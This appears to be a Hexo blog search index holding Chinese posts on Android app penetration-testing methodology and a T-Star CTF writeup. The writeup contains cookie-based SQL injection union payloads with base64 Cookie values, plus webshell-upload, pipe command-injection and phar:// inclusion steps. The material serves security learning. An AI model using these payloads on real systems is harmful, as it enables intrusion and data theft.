<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>其他更多文章</title>
    <url>/2020/07/07/%E5%85%B6%E4%BB%96%E6%9B%B4%E5%A4%9A%E6%96%87%E7%AB%A0/</url>
    <content><![CDATA[<p>​    之前写的文章主要是 靶机、CTF、域渗透、少许实战等，都比较基础。觉得有兴趣的可以看看，提一提错误。</p>
<p><img src="https://image.3001.net/images/20200710/15943670902352.png" alt="img"></p>
<a id="more"></a>

<p>joker0xxx3 博客园：<a href="https://www.cnblogs.com/joker-vip/" target="_blank" rel="noopener">https://www.cnblogs.com/joker-vip/</a></p>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>其它</tag>
      </tags>
  </entry>
  <entry>
    <title>APP安全测试学习笔记</title>
    <url>/2020/07/10/App%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>​    通过辉哥发的 “APP安全检测指南–作者：panda” 跟进学习app渗透测试。</p>
<p><img src="https://image.3001.net/images/20200710/15943664048203.png" alt="image-20200710153320829"></p>
<a id="more"></a>

<h2 id="1-客户端程序安全"><a href="#1-客户端程序安全" class="headerlink" title="1.客户端程序安全"></a>1.客户端程序安全</h2><h3 id="1-1安装包签名"><a href="#1-1安装包签名" class="headerlink" title="1.1安装包签名"></a>1.1安装包签名</h3><p>​    用JDK的jarsigner.exe检查安全包的签名，命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jarsigner.exe -verify APK文件路径 -verbose -certs</span><br></pre></td></tr></table></figure>

<p>​    以某个算命app为例，结果如下：</p>
<p><img src="https://image.3001.net/images/20200710/15943657453016.png" alt="image-20200627224441281"></p>
<p>​    如上图，测试结果为安全。只有使用直接客户的证书签名时才认定为安全，Debug 证书、第三方（如开发方）证书等均认为风险。</p>
<h3 id="1-2反编译保护"><a href="#1-2反编译保护" class="headerlink" title="1.2反编译保护"></a>1.2反编译保护</h3><p>​    把apk当做zip解压，得到classes.dex文件（可能不止一个 .dex 文件），解压后如下：</p>
<p><img src="https://image.3001.net/images/20200710/15943657505268.png" alt="image-20200628101834819"></p>
<p>​    使用dex2.jar执行如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dex2jar.bat classes.dex 文件路径</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200710/15943657542165.png" alt="image-20200628102833253"></p>
<p>​    得到classes.dex.jar文件</p>
<p><img src="https://image.3001.net/images/20200710/15943657588776.png" alt="image-20200628102833254"></p>
<p>​    使用jd-gui打开jar文件，可得到JAVA代码</p>
<p><img src="https://image.3001.net/images/20200710/15943657665063.png" alt="image-20200628104345358"></p>
<p>​    如上图，逆向后发现代码未做混淆，是不安全的。</p>
<p>​    下图为混淆后的代码，函数和变量名用无意义的字符来代替：</p>
<p><img src="https://image.3001.net/images/20200710/15943657716598.png" alt="image-20200628104622176"></p>
<p>​    通过博客得知混淆的原理：android平台的混淆原理是用“不能直接猜出含义 的通用变量名和函数名a b c等”替换编译后程序包中“ 具有明显语义信息 的变量名和函数名”，这样，通过逆向工程得到的只是 难以理解 的代码。代码混淆并不能从根本上阻止反编译等。因为代码混淆仅仅提高了阅读难度，但并不能真正阻止反编译。</p>
<h3 id="1-3应用完整性校验"><a href="#1-3应用完整性校验" class="headerlink" title="1.3应用完整性校验"></a>1.3应用完整性校验</h3><p>​    用apktool将目标apk文件解包，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar apktool.jar d -f apk文件路径 -o 解包目标文件夹</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200710/15943657763053.png" alt="image-20200628105738136"></p>
<p>​    文件结构如下：</p>
<p><img src="https://image.3001.net/images/20200710/15943657798481.png" alt="image-20200628105847820"></p>
<p>​    通过修改解包目录中的文件，可以找到logo之类的图进行修改（比较好辨认结果），我修改了咨询处的图片，如下：</p>
<p><img src="https://image.3001.net/images/20200710/15943657834488.png" alt="image-20200628113532130"></p>
<p>​    用apktool，把解包目录重新打包成未签名的apk文件，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar apktool.jar b -f 待打包的文件夹 -o 输出apk目录</span><br></pre></td></tr></table></figure>

<p>​    重新打包的时候出现很多问题，具体百度加玄学解决了</p>
<p><img src="https://image.3001.net/images/20200710/15943658034480.png" alt="image-20200628184932619"></p>
<p>​    成功输出apk文件</p>
<p><img src="https://image.3001.net/images/20200710/15943658112861.png" alt="image-20200628185217847"></p>
<p>​    用SignApk，对未签名的APK文件进行签名，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar signapk.jar testkey.x509.pem testkey.pk8 待签名apk文件路径 签名后输出apk路径</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200710/15943658167990.png" alt="image-20200629105838083"></p>
<p>​    输出签名后的apk</p>
<p><img src="https://image.3001.net/images/20200710/15943658191790.png" alt="image-20200629105858875"></p>
<p>​    将签了名的APK安装、运行、确认是否存在自校验；需要注意的是，如果之前安装的APK和修改后的APK签名不同，就不能直接覆盖安装，一般来说，先卸载之前安装的APP即可。</p>
<p>​    将客户端程序文件反编译，修改源码或资源文件后重新打包安装运行，结果如下图：</p>
<p><img src="https://image.3001.net/images/20200710/1594365822747.png" alt="image-20200629110321139"></p>
<p>​    之前为咨询图片的位置，我换成了另一张图片。经测试，此某算命app是可以被重新打包运行的。</p>
<p>​    如果是经过自校验后的情况，修改源码资源后是无法正常启动的。</p>
<h3 id="1-4组件安全"><a href="#1-4组件安全" class="headerlink" title="1.4组件安全"></a>1.4组件安全</h3><h4 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a>方案一：</h4><p>​    使用apktool解包，打开解包目录中的AndroidManifest.xml，对其中声明的各个组件，根据以下规则判断是否可导出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.显式声明了android:exported&#x3D;&quot;true&quot;，则可导出；</span><br><span class="line">2.显示声明了android:exported&#x3D;&quot;false&quot;，则不可导出；</span><br><span class="line">3.未显示声明android:exported：</span><br><span class="line">​	a) 若组件不是Content Provider：</span><br><span class="line">​		i. 若组件包含&lt;intent-filter&gt;则可导出，反之不可；</span><br><span class="line">​	b) 若组件是Content Provider：</span><br><span class="line">​		i. 若SDK版本&lt;17则可导出，反之不可。</span><br></pre></td></tr></table></figure>

<p>​    从测试的角度上，只能判断组件是否导出，但能否构成危害需要详细分析源代码后才能得出结论。一般来说，在测试时尽管写清所有的导出组件，由客户开发侧确认相关组件是否确实需要导出即可。</p>
<p><img src="https://image.3001.net/images/20200710/15943658316155.png" alt="image-20200629144318194"></p>
<p>​    启动Activity和Content Provider大多是导出组件，一般无须理会。</p>
<h4 id="方案二："><a href="#方案二：" class="headerlink" title="方案二："></a>方案二：</h4><p>​    检查 AndroidManifest.xml 文件中各组件定义标签的安全属性是否设置恰当。如果组件无须跨进程交互，则不应设置 exported 属性为 true。例如，如下图所示，当 com.umeng.message.XiaomiIntentService 的 exported属性为 true 时，将可以被其他应用调用。（当有设置权限(permissions)时，需要再考察权限属性。如 android:protectionLevel 为 signature 或 signatureOrSystem 时，只有相同签名的 apk才能获取权限。详情见附录参考资料API Guides 系统权限简介 ）</p>
<p><img src="https://image.3001.net/images/20200710/15943658358575.png" alt="image-20200629150016127"></p>
<p>​    当发现有可利用的组件导出时，（当然，并不是说所有导出的组件都是不安全的，如果要确定，必须看代码，对代码逻辑进行分析）可利用drozer测试工具进行测试。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drozer安装：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;4ef5b26dd3fb</span><br><span class="line">drozer使用：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;dfa92bab3a55</span><br></pre></td></tr></table></figure>

<h2 id="2-敏感信息安全"><a href="#2-敏感信息安全" class="headerlink" title="2.敏感信息安全"></a>2.敏感信息安全</h2><h3 id="2-1数据文件"><a href="#2-1数据文件" class="headerlink" title="2.1数据文件"></a>2.1数据文件</h3><p>​    首先查看相关文件的权限配置，正常的文件权限最后三位应为空（类似”rw-rw—-“）,即除应用自己以外任何人无法读写；目录则允许多一个执行位（类似“rwxrwx—x”）。如下图：</p>
<p><img src="https://image.3001.net/images/20200710/15943658388450.png" alt="image-20200629160646287"></p>
<p>​    权限检测完整后，再检查客户端程序存储在手机中的 SharedPreferences 配置文件，通常是对本目录下的文件内容（一般是xml）进行检查，看是否包含敏感信息。最后在检测SQLite 数据库文件，在私有目录及其子目录下查找以.db 结尾的数据库文件。对于使用了 webView 缓存的应用，会在 databases 子目录中保存 webview.db 和 webviewCache.db。其中有可能会记录 cookies 和提交表单等信息。使用数据库查看工具即可查看这些文件中是否有敏感信息。</p>
<p>​    还有些时候，客户端程序 apk 包中也是是保存有敏感信息的，比如检查 apk 包中各类文件是否包含硬编码的的敏感信息等。</p>
<h3 id="2-2Logcat日志"><a href="#2-2Logcat日志" class="headerlink" title="2.2Logcat日志"></a>2.2Logcat日志</h3><p>​    通过adb 工具连接设备：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb devices  &#x2F;&#x2F;查看安卓设备列表</span><br><span class="line">adb -s 设备名称 其它命令  &#x2F;&#x2F;当连接了多个设备时，选择操作的目标设备，否则会出错</span><br><span class="line">adb pull 手机目录名 PC目录名  &#x2F;&#x2F;从安卓设备中复制文件到电脑中</span><br></pre></td></tr></table></figure>

<p>然后使用 WinHex 打开，查看内存遗留信息。</p>
<p>也可以直接用adb查询locat日志：</p>
<p>在adb shell中，有下列命令可用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">logcat  &#x2F;&#x2F;持续输出日志，直到Ctrl+C</span><br><span class="line">logcat -d  &#x2F;&#x2F;一次性输出日志缓存，不会阻塞</span><br><span class="line">logcat -c  &#x2F;&#x2F;清空日志缓存</span><br></pre></td></tr></table></figure>

<h2 id="3-密码安全"><a href="#3-密码安全" class="headerlink" title="3.密码安全"></a>3.密码安全</h2><h3 id="3-1键盘劫持"><a href="#3-1键盘劫持" class="headerlink" title="3.1键盘劫持"></a>3.1键盘劫持</h3><p>​    通常来说，只有使用系统输入法的编辑框才能够进行键盘码记录。如果是自制的软键盘，则可以尝试进行触摸屏记录。像下图这样，不使用系统输入法，且按键随机分布的软键盘是安全的。</p>
<p><img src="https://image.3001.net/images/20200710/15943658435573.png" alt="image-20200629173937788"></p>
<h3 id="3-2随机布局软件盘"><a href="#3-2随机布局软件盘" class="headerlink" title="3.2随机布局软件盘"></a>3.2随机布局软件盘</h3><p>​    当客户端软键盘未进行随机化处理时为低风险;当客户端软键盘只在某一个页面载入时初始化一次而不是在点击输入框时重新进行随机化也为低风险。</p>
<h3 id="3-3屏幕录像"><a href="#3-3屏幕录像" class="headerlink" title="3.3屏幕录像"></a>3.3屏幕录像</h3><p>​    使用ADB进行测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb shell &#x2F;system&#x2F;bin&#x2F;screencap -p 输出png路径（安卓设备中）</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200710/1594365848230.png" alt="image-20200709161454548"></p>
<p>​    运行截图命令后，可以在 /mnt/sdcard/ 目录中查看到存在1.png</p>
<p><img src="https://image.3001.net/images/20200710/15943658509313.png" alt="image-20200709162105260"></p>
<p>​    打开查看：</p>
<p><img src="https://image.3001.net/images/20200710/15943658547041.jpg" alt="Screenshot_20200709_162157_com.android.gallery3d"></p>
<p>成功截图。</p>
<p>​    攻击者可以在用户进入登录页面，在输入密码的同时，进行连续截图，即可记录用户输入的密码。如果没有防截屏，那么即使是随机分布的、没有视觉反馈的软键盘也会被记录：<br>​    还有一种验证方式是从代码方面进行验证：首先检测需较高安全性的窗口（如密码输入框），看代码中在窗口加载时是否有类似下图的代码。按照 android SDK 的要求，开启 FLAG_SECURE 选项的窗口不能被截屏。</p>
<p><img src="https://image.3001.net/images/20200710/15943658647619.png" alt="image-20200709162413334"></p>
<p>目前 FLAG_SECURE 测试结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">N－PASS，可截图，</span><br><span class="line">ZTE 880E, 可截图</span><br><span class="line">ASUS TF300T，可阻止工具及 ddms 截图。</span><br></pre></td></tr></table></figure>

<h3 id="3-4手势密码"><a href="#3-4手势密码" class="headerlink" title="3.4手势密码"></a>3.4手势密码</h3><p>​    手势密码的复杂度：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.进入客户端设置手势密码的页面进行手势密码设置。</span><br><span class="line">2.进行手势密码设置，观察客户端手势密码设置逻辑是否存在最少点位的判断。</span><br><span class="line">3.反编译 APK 为 jar 包，通过 jd-gui 观察对应代码逻辑是否有相应的判断和限制条件。（一般设置手势密码若输入点数过少时会有相应的文字提示，通过此文字提示可以快速定位到代码位置）</span><br></pre></td></tr></table></figure>

<p>​    手势密码的修改和取消：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.进入客户端设置手势密码的位置，一般在个人设置或安全中心等地方。</span><br><span class="line">2.进行手势密码修改或取消操作，观察进行此类操作时是否需要输入之前的手势密码或普通密码。</span><br><span class="line">3.观察在忘记手势密码等其他客户端业务逻辑中是否存在无需原始手势或普通密码即可修改或取消手势密码的情况。</span><br><span class="line">4.多次尝试客户端各类业务，观察是否存在客户端逻辑缺陷使得客户端可以跳转回之前业务流程所对应页面。若存在此类逻辑（例如手势密码设置），观察能否修改或取消手势密码。</span><br><span class="line">5.反编译 APK 为 jar 包，通过 jd-gui 观察对应代码逻辑，寻找客户端对于手势密码的修改和删除是否存在相应的安全策略。</span><br></pre></td></tr></table></figure>

<p>​    手势密码的本地信息保存：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.首先通过正常的操作流程设置一个手势密码并完整一次完整的登陆过程。</span><br><span class="line">2.寻找&#x2F;data&#x2F;data 的私有目录下是否存在手势密码对应敏感文件，若进行了相关的信息保存，基本在此目录下。（关键词为 gesture，key 等）</span><br><span class="line">3.若找到对应的文件，观察其存储方式，为明文还是二进制形式存储，若为二进制形式，观察其具体位数是否对应进行 MD5（二进制 128 位，十六进制 32 位或 16 位）、SHA-1（二进制 160 位，十六进制 40 位）等散列后的位数。如果位数对应，即可在反编译的jar包中搜索对应的关键字以迅速对应代码。</span><br><span class="line">4.通过代码定位确认其是否进行了除单项哈希散列之外的加密算法，若客户端未将手势密码进行加密或变形直接进行散列处理可认为其不安全，一是因为现阶段 MD5、SHA-1 等常用的哈希算法已被发现碰撞漏洞，二是网络中存在 www.somd5.com 等散列值查询网站可以通过大数据查询的方式获取散列前的明文手势密码。</span><br></pre></td></tr></table></figure>

<p>​    手势密码的锁定策略：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.首先通过正常的操作流程设置一个手势密码。</span><br><span class="line">2.输入不同于步骤 1 中的手势密码，观察客户端的登陆状态及相应提示。若连续输入多次手势密码错误，观察当用户处于登陆状态时是否退出当前的登陆状态并关闭客户端；当</span><br><span class="line">客户未处于登录状态时是否关闭客户端并进行一定时间的输入锁定。</span><br><span class="line">3.反编译 APK 为 jar 包，通过 jd-gui 观察对应代码逻辑，寻找客户端是否针对输入次数及锁定时间有相应的逻辑处理。</span><br></pre></td></tr></table></figure>

<p>​    手势密码的抗攻击测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.下载并安装 Xposed 框架及 SwipeBack 插件。</span><br><span class="line">2.启动客户端并进入手势密码输入页。</span><br><span class="line">3.启动 SwipeBack 插件，观察是否可以通过滑动关闭手势密码输入页的方式进入登陆后的页面。</span><br></pre></td></tr></table></figure>

<h2 id="4-安全策略"><a href="#4-安全策略" class="headerlink" title="4.安全策略"></a>4.安全策略</h2><h3 id="4-1密码复杂度检测："><a href="#4-1密码复杂度检测：" class="headerlink" title="4.1密码复杂度检测："></a>4.1密码复杂度检测：</h3><p>​    测试客户端程序是否检查用输入的密码强度，禁止设置弱口令。</p>
<h3 id="4-2账号登录限制："><a href="#4-2账号登录限制：" class="headerlink" title="4.2账号登录限制："></a>4.2账号登录限制：</h3><p>​    测试一个帐号是否可以同时在多设备上成功登录客户端，进行操作。 </p>
<h3 id="4-3账户锁定策略"><a href="#4-3账户锁定策略" class="headerlink" title="4.3账户锁定策略"></a>4.3账户锁定策略</h3><p>​    测试客户端是否限制登录尝次数。 防止木马使用穷举法暴力破解用户密码。</p>
<h3 id="4-4问题验证"><a href="#4-4问题验证" class="headerlink" title="4.4问题验证"></a>4.4问题验证</h3><p>​    测试对账号某些信息（如单次支付限额）的修改是否有私密问题验证。私密问题验证是否将问题和答案一一对应。私密问题是否足够机密。</p>
<h3 id="4-5会话安全"><a href="#4-5会话安全" class="headerlink" title="4.5会话安全"></a>4.5会话安全</h3><p>​    测试客户端在超过20分钟无操作后，是否会使会话超时并要求重新登录。超时时间是否合理。</p>
<h3 id="4-6界面切换保护"><a href="#4-6界面切换保护" class="headerlink" title="4.6界面切换保护"></a>4.6界面切换保护</h3><p>​    检查客户端程序在切换到其他应用时，已经填写的账号密码等敏感信息是否会清空，防止用户敏感信息泄露。如果切换前处于已登录状态，切换后一定时间内是否会自动退出当前会话。</p>
<h3 id="4-7UI信息泄露"><a href="#4-7UI信息泄露" class="headerlink" title="4.7UI信息泄露"></a>4.7UI信息泄露</h3><p>​    检查客户端的各种功能，看是否存在敏感信息泄露问题。使用错误的登录名或密码，看客户端提示是否不同。在显示卡号等敏感信息时是否进行部分遮挡。</p>
<h3 id="4-8验证码安全"><a href="#4-8验证码安全" class="headerlink" title="4.8验证码安全"></a>4.8验证码安全</h3><p>​    测试客户端在登录和交易时是否使用图形验证码。验证码是否符合如下要求:由数字和字母等字符混合组成;采取图片底纹干扰、颜色变换、设置非连续性及旋转图片字体、异字体显示样式等有效方式，防范恶意代码自动识别图片上的信息;具有使用时间限制并仅能使用一次;验证码由服务器生成，客户端文件中不包含图形验证码文本内容。（观察验证码组成,若简单,可以尝试使用PKAVHttpFuzzer的验证码识别工具进行识别）</p>
<h3 id="4-9安全退出"><a href="#4-9安全退出" class="headerlink" title="4.9安全退出"></a>4.9安全退出</h3><p>​    检查客户端在退出时，是否向服务端发送终止会话请求。客户端退出后，还能否使用退出前的会话id访问登录后才能访问的页面。</p>
<h3 id="4-10密码修改验证"><a href="#4-10密码修改验证" class="headerlink" title="4.10密码修改验证"></a>4.10密码修改验证</h3><p>​    测试客户端在修改密码时是否验证旧密码正确性。</p>
<h3 id="4-11Activity界面劫持"><a href="#4-11Activity界面劫持" class="headerlink" title="4.11Activity界面劫持"></a>4.11Activity界面劫持</h3><p>​    安装Hi jackActivity.apk,使用activity 界面劫持工具，在工具中指定要劫持的应用进程名称。如图所示，从列表中选择被测试的应用，点击0K。打开应用，测试工具会尝试用自己的窗口覆盖被测的应用。</p>
<h2 id="5-进程保护"><a href="#5-进程保护" class="headerlink" title="5.进程保护"></a>5.进程保护</h2><h3 id="5-1内存访问和修改"><a href="#5-1内存访问和修改" class="headerlink" title="5.1内存访问和修改"></a>5.1内存访问和修改</h3><p>需要root权限，可以使用MemSpector查看、搜索和修改客户端内存数据，如图所示。用户名密码等数据通常会在/dev/ashmem/dalvik-heap内存段。(目前大多数工具都是通过ptrace接口修改客户端内存，可以使用ptrace机制本身防护。)</p>
<p><img src="https://image.3001.net/images/20200710/15943658745132.png" alt="image-20200710114020175"></p>
<h3 id="5-2动态注入"><a href="#5-2动态注入" class="headerlink" title="5.2动态注入"></a>5.2动态注入</h3><p>​    通过注入动态链接库，hook 客户端某些关键函数，从而获取敏感信息或者改变程序执行。检测 LD_PRELOAD 环境变量。使用 LD_PRELOAD 环境变量，可以让进程预先加载任意 so ，劫持函数。</p>
<h2 id="6-通信安全"><a href="#6-通信安全" class="headerlink" title="6.通信安全"></a>6.通信安全</h2><h3 id="6-1通信加密"><a href="#6-1通信加密" class="headerlink" title="6.1通信加密"></a>6.1通信加密</h3><p>​    如果客户端与服务器之间的通信加密协议实现不当，攻击者将有机会对当前网络环境中其他合法用户的通信内容进行窃听甚至篡改。</p>
<h3 id="6-2证书有效性"><a href="#6-2证书有效性" class="headerlink" title="6.2证书有效性"></a>6.2证书有效性</h3><p>​    主要测试SSL协议安全性、SSL证书验证等。</p>
<h3 id="6-3关键数据加密和校验"><a href="#6-3关键数据加密和校验" class="headerlink" title="6.3关键数据加密和校验"></a>6.3关键数据加密和校验</h3><p>​    测试客户端程序提交数据给服务端时，密码、收款人信息等关键字段是否进行了加密，防止恶意用户嗅探到用户数据包中的密码等敏感信息。</p>
<h3 id="6-4访问控制"><a href="#6-4访问控制" class="headerlink" title="6.4访问控制"></a>6.4访问控制</h3><p>​    测试客户端访问的URL是否仅能由手机客户端访问。是否可以绕过登录限制直接访问登录后才能访问的页面，对需要二次验证的页面(如私密问题验证)，能否绕过验证。</p>
<h3 id="6-5客户端更新安全性"><a href="#6-5客户端更新安全性" class="headerlink" title="6.5客户端更新安全性"></a>6.5客户端更新安全性</h3><p>​    使用代理抓取检测更新的数据包，尝试将服务器返回的更新url替换为恶意链接。看客户端是否会直接打开此链接并下载应用。在应用下载完毕后，测试能否替换下载的apk 文件，测试客户端是否会安装替换后的应用。</p>
<h3 id="6-6短信重放攻击"><a href="#6-6短信重放攻击" class="headerlink" title="6.6短信重放攻击"></a>6.6短信重放攻击</h3><p>​    检测应用中是否存在数据包重放攻击的安全问题。是否会对客户端用户造成短信轰炸的困扰。</p>
<h2 id="7-业务安全"><a href="#7-业务安全" class="headerlink" title="7.业务安全"></a>7.业务安全</h2><h3 id="7-1越权操作"><a href="#7-1越权操作" class="headerlink" title="7.1越权操作"></a>7.1越权操作</h3><p>​    服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致攻击账号拥有了其他账户的增删改查功能。</p>
<h3 id="7-2交易篡改"><a href="#7-2交易篡改" class="headerlink" title="7.2交易篡改"></a>7.2交易篡改</h3><p>​    本项测试主要是修改金额信息(如:转帐金额为负值)，订单信息(如:订单的数量)等</p>
<h3 id="7-3重放攻击"><a href="#7-3重放攻击" class="headerlink" title="7.3重放攻击"></a>7.3重放攻击</h3><p>​    主要就是进行抓包重放(如:重放产品购买、订单创造等)测试。</p>
<h3 id="7-4用户枚举"><a href="#7-4用户枚举" class="headerlink" title="7.4用户枚举"></a>7.4用户枚举</h3><p>​    此类漏洞情境一般是:登录界面无验证码、有明显的返回信息(如:该账号不存在、密码错误等)</p>
<h3 id="7-5暴力破解"><a href="#7-5暴力破解" class="headerlink" title="7.5暴力破解"></a>7.5暴力破解</h3><p>​    主要是测试业务中查询、登录等功能，尝试使用暴力枚举的方式进行破解。</p>
<h3 id="7-6注入-XSS-CSRF"><a href="#7-6注入-XSS-CSRF" class="headerlink" title="7.6注入/XSS/CSRF"></a>7.6注入/XSS/CSRF</h3><p>​    和WEB测试类似，主要测试站点存在的常见的web漏洞。</p>
]]></content>
      <categories>
        <category>APP渗透</category>
      </categories>
      <tags>
        <tag>APP渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>腾讯T-Star高校挑战赛writeup --by白给</title>
    <url>/2020/07/05/T-Star%E6%8C%91%E6%88%98%E8%B5%9Bwp/</url>
    <content><![CDATA[<p>2020.06.30，参加T-Star高校挑战赛，总共十个题，团队做出来八个，感谢队友带飞。</p>
<p><img src="https://image.3001.net/images/20200707/15940876746684.png" alt="image-20200703143606576"></p>
<a id="more"></a>
<p><img src="https://image.3001.net/images/20200707/15940876819693.png" alt="image-20200703143513478"></p>
<h2 id="1-题目一-签到"><a href="#1-题目一-签到" class="headerlink" title="1.题目一 签到"></a>1.题目一 签到</h2><h3 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h3><p>上传为前端js的验证，将php一句话后缀改为jpg，上传抓包修改后缀为php，上传成功</p>
<p><img src="https://image.3001.net/images/20200707/15940876867302.jpg" alt="img"> </p>
<p>查看地址</p>
<p><img src="https://image.3001.net/images/20200707/15940876916389.jpg" alt="img"> </p>
<p>用菜刀连接，查看flag</p>
<p><img src="https://image.3001.net/images/20200707/15940876964613.jpg" alt="img"> </p>
<h3 id="flag值："><a href="#flag值：" class="headerlink" title="flag值："></a>flag值：</h3><p>key{K735c9f0D7ddc3b9}</p>
<h2 id="2-题目二-命令执行基础"><a href="#2-题目二-命令执行基础" class="headerlink" title="2.题目二 命令执行基础"></a>2.题目二 命令执行基础</h2><h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p>用&amp;&amp;不行，采用管道符执行。</p>
<p><img src="https://image.3001.net/images/20200707/15940877018976.png" alt="image-20200703143926169"></p>
<p>执行结果：</p>
<p><img src="https://image.3001.net/images/20200707/15940877064286.png" alt="image-20200703143935690"></p>
<p>通过查看上级目录文件不断查看，找打key文件位置。cat查看内容</p>
<p><img src="https://image.3001.net/images/20200707/15940877131593.png" alt="image-20200703143940672"></p>
<p>查看结果:</p>
<p><img src="https://image.3001.net/images/20200707/15940877201080.png" alt="image-20200703143950416"></p>
<h3 id="flag值：-1"><a href="#flag值：-1" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{usderhky}</p>
<h2 id="3-题目三-你能爆破吗"><a href="#3-题目三-你能爆破吗" class="headerlink" title="3.题目三 你能爆破吗"></a>3.题目三 你能爆破吗</h2><h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h3><p>admin admin弱口令登进去，发现回显cookie，可以用cookie注入，cookie为用户名的base64编码，所以还需要把payload进行base64编码<br>首先判断字段数，暴出位置，<br>暴库payload：<br>-admin” union select 1,2,database()#<br>Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj</p>
<p><img src="https://image.3001.net/images/20200707/15940877245083.png" alt="image-20200703144314036"></p>
<p>爆表：<br>-admin” union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#<br>Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkj</p>
<p><img src="https://image.3001.net/images/20200707/15940877288104.png" alt="image-20200703144320621"></p>
<p>暴字段：<br>-admin” union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’flag’#<br>Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSdmbGFnJyM=</p>
<p><img src="https://image.3001.net/images/20200707/15940877978489.png" alt="image-20200703144332264"></p>
<p>暴值：<br>-admin” union select 1,2,group_concat(flag) from flag#</p>
<p><img src="https://image.3001.net/images/20200707/15940878018984.png" alt="image-20200703144338860"></p>
<h3 id="flag值：-2"><a href="#flag值：-2" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{a405ef895ef46d96}</p>
<h2 id="4-题目四-文件上传"><a href="#4-题目四-文件上传" class="headerlink" title="4.题目四 文件上传"></a>4.题目四 文件上传</h2><h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a>操作内容：</h3><p>上传抓包修改文件后缀，php被过滤不能上传，用pht也可以解析成php，图片内容之后加上php代码查看phpinfo发现被过滤了前面的尖括号、问号和php</p>
<p><img src="https://image.3001.net/images/20200707/15940878098560.png" alt="image-20200703144445977"></p>
<p>使用双写绕过</p>
<p><img src="https://image.3001.net/images/20200707/15940878137015.png" alt="image-20200703144532773"></p>
<p>查看成功解析</p>
<p><img src="https://image.3001.net/images/20200707/15940878173306.png" alt="image-20200703144537190"></p>
<p>构造payload重传，</p>
<p><img src="https://image.3001.net/images/20200707/15940878212427.png" alt="image-20200703144542942"></p>
<p>解析页面传参代码执行得到flag</p>
<p><img src="https://image.3001.net/images/20200707/15940878251991.png" alt="image-20200703144548208"></p>
<h3 id="flag值：-3"><a href="#flag值：-3" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{Aa3c7c37508E40B3}</p>
<h2 id="5-题目五-文件包含GetShell"><a href="#5-题目五-文件包含GetShell" class="headerlink" title="5.题目五 文件包含GetShell"></a>5.题目五 文件包含GetShell</h2><h3 id="操作内容：-4"><a href="#操作内容：-4" class="headerlink" title="操作内容："></a>操作内容：</h3><p>查看源码，发现了lfi.txt，查看lfi.txt，发现可以文件包含，上传只能上传txt类型</p>
<p><img src="https://image.3001.net/images/20200707/15940878293280.png" alt="image-20200703144845841"></p>
<p>把php一句话压缩成zip</p>
<p><img src="https://image.3001.net/images/20200707/15940878325227.png" alt="image-20200703144849819"></p>
<p>压缩之后修改后缀为txt，上传成功</p>
<p><img src="https://image.3001.net/images/20200707/15940878363196.png" alt="image-20200703144857316"></p>
<p>用php伪协议phar://解压进行利用<br><a href="http://c3c85e3a.yunyansec.com/lfi.php?file=phar://files/Z47zIdPkWHq5l5DQ.txt/33" target="_blank" rel="noopener">http://c3c85e3a.yunyansec.com/lfi.php?file=phar://files/Z47zIdPkWHq5l5DQ.txt/33</a><br>菜刀连接找到flag</p>
<p><img src="https://image.3001.net/images/20200707/15940878397510.png" alt="image-20200703144902999"></p>
<p>查看</p>
<p><img src="https://image.3001.net/images/20200707/1594087842543.png" alt="image-20200703144906810"></p>
